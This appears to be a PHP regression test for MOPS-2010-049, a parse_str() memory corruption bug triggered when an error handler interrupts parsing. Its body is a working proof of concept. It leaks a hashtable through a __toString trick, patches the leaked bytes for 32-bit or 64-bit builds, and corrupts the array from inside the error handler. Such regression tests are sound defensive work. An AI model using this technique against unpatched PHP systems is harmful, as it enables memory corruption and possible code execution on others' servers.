--TEST--
MOPS-2010-049: PHP parse_str() Interruption Memory Corruption Vulnerability
--FILE--
<?php

    ini_set("display_errors", 0);
   
    $GLOBALS['leakedArray'] = leakAnArray();
   
    echo "TEST\n";
   
    /* Setup Error Handler */
    set_error_handler("my_error");
   
    /* Trigger the Code */
    $x = "";
    parse_str("a".str_repeat("[]", 200)."=1&x=y&x=y", $x);
    restore_error_handler();

    function my_error()
    {
        headers_sent($GLOBALS['x']);
        for ($i=0; $i<strlen($GLOBALS['leakedArray']); $i++)
            $GLOBALS['x'][$i] = $GLOBALS['leakedArray'][$i];
        return 1;
    }

    /* helpers to leak a valid hashtable */

    class dummy
    {
        function __toString()
        {          
            /* now the magic */
            parse_str("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=1", $GLOBALS['var']);
            return "XXXXX";
        }
    }
   
    function leakAnArray()
    {
        /* Detect 32 vs 64 bit */
        $i = 0x7fffffff;
        $i++;
        if (is_float($i)) {
            $GLOBALS['var'] = str_repeat("A", 39);
        } else {
            $GLOBALS['var'] = str_repeat("A", 67);     
        }

        /* Trigger the Code */
        $x = http_build_query(array(1 => 1),&$GLOBALS['var'], new dummy());
        $x = substr($x, 0, strlen($x)-3);

        /* patch array */
        if (is_float($i)) {
            for ($j=0; $j<4; $j++) {
                $x[0x20 + $j] = 'A';
            }
        } else {
            for ($j=0; $j<8; $j++) {
                $x[0x38 + $j] = 'A';
            }
        }
        return $x;
    }
?>
--EXPECTF--
TEST
